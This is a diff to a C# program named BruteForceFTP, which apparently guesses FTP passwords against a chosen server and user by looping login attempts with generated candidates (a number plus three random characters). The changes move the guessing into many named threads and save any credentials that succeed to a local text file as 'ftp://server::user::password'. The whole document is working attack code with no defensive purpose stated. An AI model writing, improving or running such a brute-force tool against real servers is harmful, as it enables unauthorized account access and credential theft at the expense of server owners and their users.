@@ -9,17 +9,20 @@ using System.Threading;
 using System.Timers;
 using System.Diagnostics;
 using WebCamService;
+using System.Linq.Expressions;
 
 namespace BruteForceFTP
 {
     public class FTPBrute
     {
+        public static List<Thread> threadList = new List<Thread>();
+
         public static String srv;
         public static String usr;
 
         private static bool foundLogin = false;
         private static Random rand = new Random();
-        private static int attempts = 0;
+        private static int attempts = 1;
 
         static String Ftp_Srv()
         {
@@ -45,7 +48,7 @@ namespace BruteForceFTP
         protected int pwd_first(int start, int end)
         {
             int pwd_first;
-            pwd_first = rand.Next(start, end);
+            pwd_first = rand.Next(start, end + 1);
             return pwd_first;
         }
 
@@ -57,12 +60,15 @@ namespace BruteForceFTP
             .Select(s => s[rand.Next(s.Length)]).ToArray());
         }
 
-        public void Brute(String srv, String usr)
+        public void Brute()
         {
+            string credDetails = "";
+
             while (!foundLogin)
             {
-                String pwd_num = pwd_first(500, 600).ToString();
-                String pwd_chr = pwd_second(3).ToString();
+                string pwd_num = pwd_first(501, 501).ToString();
+                string pwd_chr = pwd_second(3).ToString();
+
                 var pwd = pwd_num + pwd_chr;
 
                 FtpClient ftp = new FtpClient(srv, usr, pwd);
@@ -71,11 +77,10 @@ namespace BruteForceFTP
                 {
                     ftp.Login();
                 }
-                catch (FtpClient.FtpException e)
+                catch (FtpClient.FtpException returncode)
                 {
-
-                    var path = (Directory.GetCurrentDirectory() + @"\" + usr + ".txt");
-                    switch (e.Message)
+                    // Console.WriteLine(pwd);
+                    switch (returncode.Message)
                     {
                         case "530":
                             attempts += 1;
@@ -83,22 +88,33 @@ namespace BruteForceFTP
 
                             break;
                         case "230":
-                            Console.WriteLine("\nSuccessfully acquired login details after {0} attempts, Saving. [+]", attempts);
-                            File.WriteAllText(path, "ftp://" + srv.ToString() + "::" + usr + "::" + pwd);
+                            Console.Write("\rSuccessfully acquired login details after {0} attempts, Saving [+]", attempts);
 
-                            Environment.Exit(-1);
+                            credDetails = "ftp://" + srv + "::" + usr + "::" + pwd;
+
                             foundLogin = true;
-
                             break;
                     }
                 }
             }
+
+            Console.WriteLine("\n");
+
+            // Console.WriteLine("((" + Thread.CurrentThread.Name.ToString() + "))" + "((" + credDetails + "))");
+
+            var path = (Directory.GetCurrentDirectory() + @"\" + usr + ".txt");
+
+            File.WriteAllText(path, credDetails);
+
+            Environment.Exit(1);
         }
 
         public class Threading : FTPBrute
         {
             public void createBruteThreads()
             {
+                var tasks = new List<Task>();
+
                 int workerThreadCount;
                 int ioThreadCount;
 
@@ -106,15 +122,21 @@ namespace BruteForceFTP
 
                 ThreadPool.SetMaxThreads(workerThreadCount, ioThreadCount);
 
-                for (int i = 0; i < workerThreadCount; i++)
+                for(int i = 0; i < workerThreadCount; i++)
                 {
-                    // Console.WriteLine("ACTIVE :: " + i);
+                    Thread newThread = new Thread(new ThreadStart(Brute));
 
-                    Task newThread = Task.Run(() =>
+                    if(newThread.Name == null)
                     {
-                        Brute(srv, usr);
-                    });
+                        newThread.Name = "Thread-" + i;
+                    }
+
+                    newThread.Start();
+                    threadList.Add(newThread);
+
+                    Console.Write("\r" + i + "/" + workerThreadCount + " Threads started...");
                 }
+                Console.WriteLine("\n");
             }
         }
 
@@ -122,12 +144,10 @@ namespace BruteForceFTP
         static void Main()
         {
             Threading Threading = new Threading();
-            FTPBrute Program = new FTPBrute();
 
             PrepareBrute();
-
+            
             Threading.createBruteThreads();
-            Program.Brute(srv, usr);
         }
     }
 }
